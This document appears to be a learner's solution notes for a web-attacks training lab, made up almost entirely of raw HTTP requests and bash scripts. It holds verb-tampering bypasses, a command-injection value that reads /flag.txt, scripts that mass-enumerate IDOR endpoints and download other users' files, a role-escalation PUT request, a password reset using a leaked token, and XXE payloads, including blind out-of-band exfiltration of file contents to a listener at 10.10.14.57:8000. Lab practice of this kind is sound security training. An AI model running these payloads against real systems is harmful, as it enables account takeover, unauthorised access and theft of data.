# Bypassing Basic Authentication


```bash
DELETE /admin/reset.php? HTTP/1.1
Host: 94.237.59.174:37363
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.174:37363/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


Steps:
1. change GET to POST and next to HEAD,DELETE,Patch,Options

```


# Bypassing Security Filters

```bash
curl -i -X HTTP_Verb_Tampering http://SERVER_IP:PORT/
POST /index.php HTTP/1.1
Host: 94.237.59.174:37363
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

filename=file1;%20cat%20/flag.txt;

Steps:
1. change GET to POST

```

# Mass IDOR Enumeration

## GET 

```bash

#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

```


## POST
### Soluction

```bash

#!/bin/bash

url="http://94.237.54.176:47463"

for i in {1..20}; do
    echo "Fetching: $url/documents.php"
    response=$(curl -s -X POST -d "uid=$i" "$url/documents.php")
    echo "Response received for UID $i:"
    echo "$response" 

    for link in $(echo "$response" | grep -oP "\/documents.*?.txt"); do
        echo "Found link: $url$link"
        wget -q "$url$link"
    done
done

```

# Bypassing Encoded References

```bash
for i in {1..20}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

```

## GET
## soluction

```bash

#!/bin/bash

for i in {1..20}; do
    hash=$(echo -n $i | base64 )
    url="http://94.237.63.201:42092/download.php?contract=$hash"
    echo "Fetching: $url"
    response= $(curl -sOJ -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "$url")
    echo "$response"
done

cat *pdf

```


## POST

```bash

#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://94.237.54.176:47463/download.php
    done
done


```



# IDOR in Insecure APIs

Steps:
1. find how the app work and find in the middle the call to api is call the profile info

``` bash

GET /profile/api.php/profile/5 HTTP/1.1
Host: 94.237.63.201:42092
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.63.201:42092/profile/index.php
Connection: keep-alive
Cookie: role=employee


```



# Chaining IDOR Vulnerabilities

Steps: 
1. LEAK all uuid to find the admin
2. Get uuid the admin and change the email

```bash

#!/bin/bash

for i in {1..20}; do
    url="http://94.237.63.201:42092/profile/api.php/profile/$i"
    response=$(curl  -s $url)
    echo "$response"
done


```

change email

```bash

PUT /profile/api.php/profile/10 HTTP/1.1
Host: 94.237.63.201:42092
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.63.201:42092/profile/index.php
Content-type: application/json
Content-Length: 175
Origin: http://94.237.63.201:42092
Connection: keep-alive
Cookie: role=employee

{"uid":10,"uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"I don't like quoting others!"}

```

# Local File Disclosure


Steps:
1.Entity have to be the same with email in DOCTYPE
2.not in this exercise but maybe sametimes you have to, if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml
3.

```bash

POST /submitDetails.php HTTP/1.1
Host: 10.129.207.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 246
Origin: http://10.129.207.224
Connection: keep-alive
Referer: http://10.129.207.224/

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
<root>
<name>admin</name>
<tel></tel>
<email>&company;</email>
<message>memory</message>
</root>

```


# advanced File Disclosure

Steps:
1. set xml payload
2. set the file xxe.dtd
3. set the email to &joined
4. set a server http
5. send the payload and change the email

file xxe.dtd

```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

```
Request

```bash 
POST /submitDetails.php HTTP/1.1
Host: 10.129.207.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 327
Origin: http://10.129.207.224
Connection: keep-alive
Referer: http://10.129.207.224/

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.14.57:8000/xxe.dtd">
  %xxe;
]>
<root>
<name>gfcgv</name>
<tel></tel>
<email>&joined;</email>
<message>sdv</message>
</root>


```


# Blind Data Exfiltrate

Steps:
1. Set the file xxe.dtd
2. set python http.server
3. Set the payload in request
4. decode the base64 to see the flag

1. 
```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.57:8000/?content=%file;'>">

```
2. 
```bash
python3 -m http.server

```

3. 
```bash
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.207.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 242
Origin: http://10.129.207.224
Connection: keep-alive
Referer: http://10.129.207.224/blind/

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.57:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
<name>admin</name>
<tel></tel>
<email>&content;</email>
<message>sdaca</message>
</root>

```


# Web Attacks - Skills Assesment

## IDOR enum user
```bash 
#!/bin/bash

for i in {1..101}; do
    url="http://94.237.63.201:55896/api.php/user/$i"
    response=$(curl -s "$url" \
        -H "Host: 94.237.63.201:55896" \\
        -H "Cookie: PHPSESSID=h4bnfl2gog0so1veesn7fuath6; uid=$i")
    echo "$response"
done

```

## IDOR enum token to change password

```bash

#!/bin/bash

for i in {1..101}; do
    url="http://94.237.63.201:55896/api.php/token/$i"
    response=$(curl -s "$url" \
        -H "Host: 94.237.63.201:55896" \\
        -H "Cookie: PHPSESSID=h4bnfl2gog0so1veesn7fuath6; uid=$i")
    echo "$i"
    echo "$response"
done

```

{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}

{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}


# Verb Tampering to bypass checks to reset the password

```bash 

GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123456789 HTTP/1.1
Host: 94.237.63.201:55896
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: */*
Origin: http://94.237.63.201:55896
Referer: http://94.237.63.201:55896/settings.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=v8hasdq1vfdr5k6cl52p17m6me; uid=52
Connection: keep-alive

```

## XML 

```bash
POST /addEvent.php HTTP/1.1
Host: 94.237.63.201:55896
Content-Length: 261
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://94.237.63.201:55896
Referer: http://94.237.63.201:55896/event.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=v8hasdq1vfdr5k6cl52p17m6me; uid=52
Connection: keep-alive

<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
            <root>
            <name>&company;</name>
            <details>flag</details>
            <date>2022-06-27</date>
            </root>

```
